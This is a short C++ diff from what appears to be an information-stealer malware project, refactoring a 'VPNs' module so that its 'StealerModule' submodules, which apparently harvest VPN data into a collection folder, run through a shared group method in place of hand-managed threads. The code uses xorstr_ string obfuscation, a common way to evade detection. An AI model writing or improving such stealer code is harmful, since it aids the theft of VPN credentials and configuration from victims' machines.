@@ -12,17 +12,5 @@ VPNs::VPNs()
 
 void VPNs::execute(fs::path &root) {
     fs::path vpns_path = root / xorstr_("VPNs");
-    std::vector<std::thread> threads;
-
-    for(StealerModule* module : this->modules) {
-        threads.emplace_back([module, &vpns_path]() {
-            module->execute(vpns_path);
-        });
-    }
-
-    for(auto& thread : threads) {
-        if (thread.joinable()) {
-            thread.join();
-        }
-    }
+    StealerModuleGroup::execute(vpns_path);
 }
